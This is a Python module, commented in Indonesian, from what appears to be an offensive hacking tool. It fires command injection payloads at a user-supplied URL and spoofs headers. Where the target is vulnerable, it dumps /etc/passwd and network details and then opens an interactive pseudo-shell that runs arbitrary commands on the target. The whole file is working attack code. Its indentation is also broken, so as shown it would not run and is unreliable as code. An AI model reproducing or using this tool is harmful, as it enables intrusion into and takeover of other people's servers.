"""Modul Command Injection — pindahan dari main.py legacy.

Perubahan dari legacy:
  [FIX] Menambahkan `from urllib.parse import quote, parse_qs` di atas.
        Di legacy, `quote` dan `parse_qs` dipakai tapi tidak di-import
        → NameError saat runtime.

Semua logika eksploitasi lain: IDENTIK dengan legacy.
"""
import random
import time
from urllib.parse import quote, parse_qs

import requests


def run_cmd_injection_module():
    print("-" * 60)
    print(" [ Modul: Automated Command Injection, WAF Bypass & Post-Exploitation ]")
    print("-" * 60)
    target_url = input("[?] Masukkan URL target (contoh: http://target.com/ping.php?ip=): ").strip()
    method = input("[?] Pilih Metode HTTP [GET / POST] (default: GET): ").strip().upper()
    if not method:
        method = "GET"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "X-Forwarded-For": "127.0.0.1"
    }

    injection_payloads = [
        {"payload": "; id", "desc": "Semicolon Separator"},
        {"payload": "| id", "desc": "Pipe Separator"},
        {"payload": "&& id", "desc": "AND Operator"},
        {"payload": "\n id", "desc": "Newline Injection"},
        {"payload": "`id`", "desc": "Backticks Execution"},
        {"payload": "$(id)", "desc": "Command Substitution"},
        {"payload": ";uname -a", "desc": "Semicolon System Info"},
        {"payload": "|uname -a", "desc": "Pipe System Info"},
        {"payload": "& whoami", "desc": "Windows Ampersand"},
        {"payload": "| whoami", "desc": "Windows Pipe"}
    ]

    success = False
    vulnerable_url = target_url
    successful_payload = ""

    print(f"\n[*] Menguji {len(injection_payloads)} variasi payload Command Injection secara otonom via {method}...")

    for item in injection_payloads:
        # ============================================================
        # [FIX] Di legacy, `quote` tidak di-import → NameError.
        #       Di v2, `quote` sudah di-import di atas.
        # ============================================================
        encoded_payload = quote(item["payload"], safe='')
        
        if method == "POST":
            if "?" in target_url:
                base_u, param_str = target_url.split("?", 1)
                data_dict = {k: v[0] + item["payload"] for k, v in parse_qs(param_str).items()}
            else:
                base_u = target_url
                data_dict = {"ip": "127.0.0.1" + item["payload"]}
            test_url = base_u
            current_data = data_dict
        else:
            test_url = target_url + encoded_payload
            current_data = None

        print(f"[*] Testing metode: {item['desc']}")
        try:
            if method == "POST":
                response = requests.post(test_url, data=current_data, headers=headers, timeout=5, verify=False)
            else:
                response = requests.get(test_url, headers=headers, timeout=5, verify=False)

            indicators = ["uid=", "gid=", "root", "www-data", "nt authority", "system32", "linux"]
            html_lower = response.text.lower()

            if any(ind in html_lower for ind in indicators):
                print(f"\n[+] TARGET RENTAN COMMAND INJECTION!")
                print(f"    - Metode Sukses   : {item['desc']}")
                print(f"    - Payload Digunakan: {item['payload']}")
                print(f"    - Titik Injeksi   : {test_url}")
                success = True
                vulnerable_url = target_url
                successful_payload = item["payload"]
                break
            else:
                print("    [-] Respon server normal / parameter aman.")
        except Exception as e:
            print(f"    [-] Gagal terhubung: {e}")

        if success:
        print("\n[***] MENGAKTIFKAN POST-EXPLOIT & SYSTEM ENUMERATION ENGINE [***]")
        print("[*] Menjalankan serangkaian perintah otomatis untuk mengambil alih informasi sistem target...")

        extraction_commands = [
            {"cmd": "; uname -a", "desc": "Kernel & System Architecture"},
            {"cmd": "; id && whoami", "desc": "Privilege & User Identity"},
            {"cmd": "; cat /etc/passwd", "desc": "System Users Dump"},
            {"cmd": "; ifconfig || ip a", "desc": "Network Configuration"}
        ]

    # 1. AUTO POST-EXPLOITATION (Tetap dijalankan di awal)
    for ex in extraction_commands:
        print(f"\n[*] Mengekstrak: {ex['desc']}...")
        custom_payload = ex["cmd"]
        encoded_ex_payload = quote(custom_payload, safe='')

        try:
            if method == "POST":
                if "?" in vulnerable_url:
                    base_u, param_str = vulnerable_url.split("?", 1)
                    ex_data = {k: v[0] + custom_payload for k, v in parse_qs(param_str).items()}
                else:
                    base_u = vulnerable_url
                    ex_data = {"ip": "127.0.0.1" + custom_payload}
                ex_res = requests.post(base_u, data=ex_data, headers=headers, timeout=6, verify=False)
            else:
                ex_url = vulnerable_url + encoded_ex_payload
                ex_res = requests.get(ex_url, headers=headers, timeout=6, verify=False)

            print(f"    [+] Output Berhasil Ditangkap:")
            print(f"    --------------------------------------------------")
            output_lines = ex_res.text.strip().split("\n")
            for line in output_lines[:8]:
                print(f"        {line}")
            print(f"    --------------------------------------------------")
        except Exception as e:
            print(f"    [-] Gagal mengekstrak modul ini: {e}")

    # 2. INTERACTIVE PSEUDO-SHELL (Kode dari lu)
    print("\n[***] MENGAKTIFKAN INTERACTIVE PSEUDO-SHELL [***]")
    print("[*] Ketik perintah sistem secara bebas (ketik 'exit' atau 'quit' untuk keluar)...\n")

    while True:
        try:
            custom_payload = input("TànPhá-Shell> ").strip()
            if custom_payload.lower() in ("exit", "quit"):
                print("[*] Keluar dari pseudo-shell.")
                break
            if not custom_payload:
                continue

            payload_to_send = " " + custom_payload  # Spasi di awal buat misahin dari payload asli
            encoded_ex_payload = quote(payload_to_send, safe='')

            if method == "POST":
                if "?" in vulnerable_url:
                    base_u, param_str = vulnerable_url.split("?", 1)
                    ex_data = {k: v[0] + payload_to_send for k, v in parse_qs(param_str).items()}
                else:
                    base_u = vulnerable_url
                    ex_data = {"ip": "127.0.0.1" + payload_to_send}
                ex_res = requests.post(base_u, data=ex_data, headers=headers, timeout=6, verify=False)
            else:
                ex_url = vulnerable_url + encoded_ex_payload
                ex_res = requests.get(ex_url, headers=headers, timeout=6, verify=False)

            # Output Sanitizer sederhana (buang tag HTML jika ada)
            output_text = ex_res.text.strip()
            
            print(f"\n    [+] Output:")
            print(f"    --------------------------------------------------")
            print(output_text if output_text else "[*] Perintah dieksekusi, tanpa output teks.")
            print(f"    --------------------------------------------------\n")
            
        except KeyboardInterrupt:
            print("\n[*] Sesi shell dihentikan oleh pengguna.")
            break
        except Exception as e:
            print(f"    [-] Gagal mengeksekusi perintah: {e}")

    print(f"\n[+] Sesi Post-Exploitation selesai. Akses sistem terekspos.")
else:
    print("\n[-] Target tidak merespon payload Command Injection atau aman dari eksekusi sistem.")

input("\nTekan Enter untuk kembali ke menu utama...")
